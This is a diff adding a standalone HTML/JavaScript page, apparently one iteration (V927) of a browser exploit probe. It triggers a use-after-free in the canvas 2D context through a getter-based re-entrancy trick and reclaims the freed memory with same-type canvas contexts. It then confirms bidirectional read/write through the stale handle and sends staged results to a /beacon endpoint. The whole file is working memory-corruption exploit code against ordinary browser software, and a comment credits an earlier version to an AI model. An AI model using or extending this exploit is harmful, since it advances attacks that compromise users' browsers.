@@ -1,0 +1,219 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="30;url=/"><title>V927</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style></head><body>
+<div id="log"></div><script>
+// V927 -- LINEDASH BIDIRECTIONAL R/W THROUGH ALIASED CRC2D
+// ONE triggerUAF. V923/V924 proven same-type CRC2D reclaim.
+// V930 (DeepSeek) showed data flowing but false-negative due to setLineDash normalization.
+// setLineDash spec: odd-length arrays get doubled. We use EVEN-length arrays only.
+//
+// METHOD:
+//   1. Trigger UAF, reclaim with 32 canvas+2d, strokeStyle oracle
+//   2. Set [1,2,3,4] via alias -> getLineDash via stale (T1, even, no normalization)
+//   3. Set [10,20,30,40] via stale -> getLineDash via alias (T2, even, no normalization)
+//   4. Length sweep: 2,4,8,16,32 (all even)
+//   5. lineDashOffset bidirectional
+var PRE='V927',B=1,LOG=document.getElementById('log');
+var PT=String(Date.now());
+function Lg(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(stg,stage,d){var s=('000'+B).slice(-3);B++;
+ var path='/beacon/'+PRE+'-'+s+'-'+stg+'-'+stage+'?d='+encodeURIComponent(String(d==null?'':d))+'&pt='+PT+'&t='+Date.now();
+ Lg(s+' '+stg+' '+stage+' '+d);
+ try{if(navigator.sendBeacon){navigator.sendBeacon(path);}}catch(e){}
+ try{new Image().src=path;}catch(e){}
+ try{new Image().src=path+'&k=3';}catch(e){}
+}
+var BI=1200;var pool=[];for(var i=0;i<BI;i++)pool.push(new Image());
+window.addEventListener('error',function(e){bea('FAIL','JSERR',(e.message||'')+'|L'+e.lineno);});
+function after(ms,fn){setTimeout(fn,ms);}
+
+var J='v927j';
+var prev=null;
+try{prev=JSON.parse(localStorage.getItem(J)||'null');}catch(e){prev=null;}
+if(prev&&prev.runs){
+ bea('PASS','RECOVER','prev='+prev.runs+'|stage='+prev.stage+'|note='+(prev.note||''));
+}
+var runs=(prev?prev.runs+1:1);
+var j={runs:runs,stage:'boot',note:''};
+function save(){try{localStorage.setItem(J,JSON.stringify(j));}catch(e){}}
+save();
+
+var HK='v927h',DONE=false;
+var h=null;try{h=JSON.parse(localStorage.getItem(HK)||'null');}catch(e){h=null;}
+if(!h)h={runs:0,deaths:0};
+function hs(){try{localStorage.setItem(HK,JSON.stringify(h));}catch(e){}}
+function goHome(){location.replace('/');}
+if(h.pending){
+ h.deaths++;h.pending=0;hs();
+ bea('PASS','RECOVER-H','prev-run='+h.runs+'|died-at='+(h.stage||'?')+'|deaths='+h.deaths);
+ if(h.deaths>=3){bea('FAIL','GIVEUP','probe='+PRE+'|deaths='+h.deaths);DONE=true;goHome();}
+}
+h.runs++;h.pending=1;h.stage='boot';hs();
+var wd=setTimeout(function(){if(!DONE){DONE=true;h.pending=0;hs();bea('FAIL','WATCHDOG','stuck');goHome();}},14000);
+
+var inner=null,candidates=[];
+
+function arrEq(a,b){
+ if(!a||!b||a.length!==b.length)return false;
+ for(var i=0;i<a.length;i++)if(a[i]!==b[i])return false;
+ return true;
+}
+function arrStr(a){return a?Array.prototype.slice.call(a).join(','):'null';}
+
+try{
+ bea('PASS','PLAN','PT='+PT+'|test=lineDash-bidir-even|run='+runs);
+ bea('ENTER','S0','v927|PT='+PT+'|run='+runs);
+
+ for(var i=0;i<400;i++){var a=new Array(32);a[0]=i;a=null;}
+ try{var big=new ArrayBuffer(131072);big=null;}catch(e){}
+ bea('PASS','S1','churn-done');
+
+ var outer=document.createElement('canvas');outer.width=1;outer.height=1;
+ document.body.appendChild(outer);
+ var desc={};
+ Object.defineProperty(desc,'alpha',{get:function(){
+  bea('ENTER','GET-IN','creating-2d');
+  inner=outer.getContext('2d');
+  bea('ENTER','GET-MID','inner='+(inner?'yes':'no'));
+  try{inner.setLineDash([7,7]);}catch(e){}
+  bea('ENTER','GET-OUT','marker-set');
+  return true;},configurable:true});
+
+ bea('ENTER','S2','about-to-trigger');
+ j.stage='trigger';save();
+
+ after(400,function(){
+  var threw='';
+  try{outer.getContext('bitmaprenderer',desc);}catch(e){threw=String(e&&e.message||e);}
+  j.stage='post-trigger';save();
+  bea('PASS','S2','trigger-returned|'+(threw?'threw='+threw:'clean'));
+  if(!inner){bea('FAIL','VERDICT','NO-HANDLE');DONE=true;h.pending=0;hs();clearTimeout(wd);goHome();return;}
+
+  // same-type reclaim
+  j.stage='reclaim';save();
+  for(var i=0;i<32;i++){
+   var c=document.createElement('canvas');c.width=1;c.height=1;
+   document.body.appendChild(c);
+   candidates.push(c.getContext('2d'));
+  }
+  bea('PASS','S3','reclaimed|n='+candidates.length);
+
+  // strokeStyle oracle
+  j.stage='oracle';save();
+  for(var i=0;i<candidates.length;i++){
+   candidates[i].strokeStyle='#ff0000';
+   candidates[i].save();
+   candidates[i].strokeStyle='#0000ff';
+  }
+  j.stage='oracle-restore';save();
+  bea('ENTER','S4','about-to-restore');
+  try{inner.restore();}catch(e){bea('FAIL','S4','restore-threw='+String(e&&e.message||e));}
+  bea('PASS','S4','restore-returned');
+
+  var aliasIdx=-1;
+  for(var i=0;i<candidates.length;i++){
+   if(candidates[i].strokeStyle==='#ff0000'){aliasIdx=i;break;}
+  }
+  j.note='alias='+aliasIdx;save();
+  bea('PASS','S5','alias-idx='+aliasIdx);
+
+  if(aliasIdx<0){
+   // V930 fallback: try lineDash marker instead of strokeStyle
+   bea('ENTER','S5B','strokeStyle-oracle-failed|trying-lineDash-marker');
+   // inner had setLineDash([7,7]) during trigger. check if any candidate reads it.
+   for(var i=0;i<candidates.length;i++){
+    var ld;try{ld=candidates[i].getLineDash();}catch(e){continue;}
+    if(ld&&ld.length===2&&ld[0]===7&&ld[1]===7){aliasIdx=i;break;}
+   }
+   bea('PASS','S5B','lineDash-oracle|alias='+aliasIdx);
+  }
+
+  if(aliasIdx<0){
+   bea('FAIL','VERDICT','NO-ALIAS|both-oracles-failed');
+   DONE=true;h.pending=0;hs();clearTimeout(wd);goHome();return;
+  }
+
+  var alias=candidates[aliasIdx];
+
+  // ===== T1: alias.setLineDash([1,2,3,4]) -> inner.getLineDash() =====
+  j.stage='t1';save();
+  var t1pat=[1,2,3,4]; // EVEN length, no normalization
+  bea('ENTER','T1','set-via-alias|pat='+arrStr(t1pat));
+  try{alias.setLineDash(t1pat);}catch(e){bea('FAIL','T1','set-threw='+String(e&&e.message||e));}
+
+  bea('ENTER','T1','get-via-stale');
+  var ld1=null;
+  try{ld1=inner.getLineDash();}catch(e){bea('FAIL','T1','get-threw='+String(e&&e.message||e));}
+  var ld1s=arrStr(ld1);
+  bea('PASS','T1-GET','ld='+ld1s+'|len='+(ld1?ld1.length:'null'));
+
+  var t1match=arrEq(ld1,t1pat);
+  bea(t1match?'PASS':'FAIL','T1-VERDICT',t1match?'BIDIR-READ-CONFIRMED':'MISMATCH|expected='+arrStr(t1pat)+'|got='+ld1s);
+
+  // ===== T2: inner.setLineDash([10,20,30,40]) -> alias.getLineDash() =====
+  j.stage='t2';save();
+  var t2pat=[10,20,30,40]; // EVEN length
+  bea('ENTER','T2','set-via-stale|pat='+arrStr(t2pat));
+  try{inner.setLineDash(t2pat);}catch(e){bea('FAIL','T2','set-threw='+String(e&&e.message||e));}
+
+  bea('ENTER','T2','get-via-alias');
+  var ld2=null;
+  try{ld2=alias.getLineDash();}catch(e){bea('FAIL','T2','get-threw='+String(e&&e.message||e));}
+  var ld2s=arrStr(ld2);
+  bea('PASS','T2-GET','ld='+ld2s+'|len='+(ld2?ld2.length:'null'));
+
+  var t2match=arrEq(ld2,t2pat);
+  bea(t2match?'PASS':'FAIL','T2-VERDICT',t2match?'BIDIR-WRITE-CONFIRMED':'MISMATCH|expected='+arrStr(t2pat)+'|got='+ld2s);
+
+  // ===== T3: sweep even lengths 2,4,8,16,32 =====
+  j.stage='t3';save();
+  var sweepLens=[2,4,8,16,32];
+  var sweepOK=0,sweepTotal=0;
+  var sweepResults=[];
+  for(var si=0;si<sweepLens.length;si++){
+   var slen=sweepLens[si];
+   var pat=[];
+   for(var k=0;k<slen;k++)pat.push(k+1);
+   sweepTotal++;
+   try{alias.setLineDash(pat);}catch(e){sweepResults.push(slen+'=SET-THREW');continue;}
+   var gr=null;
+   try{gr=inner.getLineDash();}catch(e){sweepResults.push(slen+'=GET-THREW');continue;}
+   if(arrEq(gr,pat)){sweepResults.push(slen+'=OK');sweepOK++;}
+   else{sweepResults.push(slen+'=MISMATCH-'+arrStr(gr));}
+  }
+  var sweepStr=sweepResults.join(';');
+  bea('PASS','T3-SWEEP','ok='+sweepOK+'/'+sweepTotal+'|'+sweepStr);
+
+  // ===== T4: lineDashOffset =====
+  j.stage='t4';save();
+  try{alias.lineDashOffset=42.5;}catch(e){}
+  var off1='?';try{off1=inner.lineDashOffset;}catch(e){off1='THREW';}
+  try{inner.lineDashOffset=99.25;}catch(e){}
+  var off2='?';try{off2=alias.lineDashOffset;}catch(e){off2='THREW';}
+  bea('PASS','T4-OFFSET','a-set=42.5|s-read='+off1+'|s-set=99.25|a-read='+off2);
+  var t4match=(off1===42.5&&off2===99.25);
+  bea(t4match?'PASS':'FAIL','T4-VERDICT',t4match?'OFFSET-BIDIR-CONFIRMED':'MISMATCH|'+off1+'|'+off2);
+
+  // ===== T5: also test odd-length to confirm normalization =====
+  j.stage='t5';save();
+  var t5pat=[100,200,300]; // ODD, should normalize to [100,200,300,100,200,300]
+  try{alias.setLineDash(t5pat);}catch(e){}
+  var ld5=null;
+  try{ld5=inner.getLineDash();}catch(e){}
+  var ld5s=arrStr(ld5);
+  var t5norm=[100,200,300,100,200,300];
+  var t5match=arrEq(ld5,t5norm);
+  bea('PASS','T5-NORM','odd-set='+arrStr(t5pat)+'|got='+ld5s+'|normalized='+t5match);
+
+  // ===== FINAL =====
+  var allPass=(t1match&&t2match&&t4match);
+  var verdict=allPass?'FULL-BIDIR-RW-CONFIRMED':'PARTIAL';
+  if(!t1match&&!t2match)verdict='BIDIR-DEAD';
+  bea('PASS','VERDICT','PT='+PT+'|'+verdict+'|t1='+t1match+'|t2='+t2match+'|t4='+t4match+'|t5norm='+t5match+'|sweep='+sweepStr+'|alias='+aliasIdx);
+
+  j.stage='done';j.note=verdict+'|alias='+aliasIdx;save();
+  bea('PASS','S9','DONE|'+verdict);
+  DONE=true;h.pending=0;h.deaths=0;hs();clearTimeout(wd);
+  setTimeout(goHome,600);
+ });
+}catch(e){bea('FAIL','FATAL',String(e&&e.message||e));}
+</script></body></html>
